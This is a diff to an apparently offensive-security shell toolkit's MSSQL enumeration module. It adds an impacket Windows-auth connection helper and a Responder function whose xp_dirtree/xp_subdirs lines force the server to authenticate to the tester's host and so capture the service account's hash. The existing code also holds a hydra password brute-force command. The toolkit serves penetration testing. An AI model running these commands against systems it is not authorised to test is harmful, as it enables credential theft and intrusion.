@@ -18,7 +18,9 @@ nb-enum-mssql-tcpdump             capture traffic to and from a host
 nb-enum-mssql-connect             make an interactive database connection
 nb-enum-mssql-connect-local       if we are targetting a local account
 nb-enum-mssql-mssqlclient         use an alternative to sqsh, use impacket to connect
+nb-enum-mssql-mssqlclient-local   use an alternative to sqsh, use impacket to connect
 nb-enum-mssql-hydra               brute force passwords for a user account
+nb-enum-mssql-responder           capture mssql service hash
 
 DOC
 }
@@ -60,8 +62,14 @@ nb-enum-mssql-mssqlclient() {
     nb-vars-set-rhost
     nb-vars-set-user
     local db && __askvar db DATABASE
-    #print -z "mssqlclient.py ${__USER}@${__RHOST} -db ${db} -windows-auth "
     print -z "mssqlclient.py -p 1433 ${__USER}@${__RHOST}"
+}
+
+nb-enum-mssql-mssqlclient-local() {
+    nb-vars-set-rhost
+    nb-vars-set-user
+    local db && __askvar db DATABASE
+    print -z "mssqlclient.py -p 1433 ${__USER}@${__RHOST} -db ${db} -windows-auth"
 }
 
 nb-enum-mssql-hydra() {
@@ -69,4 +77,15 @@ nb-enum-mssql-hydra() {
     nb-vars-set-rhost
     nb-vars-set-user
     print -z "hydra -l ${__USER} -P ${__PASSLIST} -o $(__hostpath)/mssql-hydra-brute-pass.txt ${__RHOST} mssql -F -t 64"
+}
+
+nb-enum-mssql-responder() {
+    __check-project
+    nb-vars-set-lhost
+    print -z "responder -I tun0"
+
+    echo
+    __info "Run the following commands in mssql client:"
+    __ok "  EXEC master..xp_dirtree '\\${__LHOST}\share\'"
+    __ok "  EXEC master..xp_subdirs '\\${__LHOST}\share\'"
 }
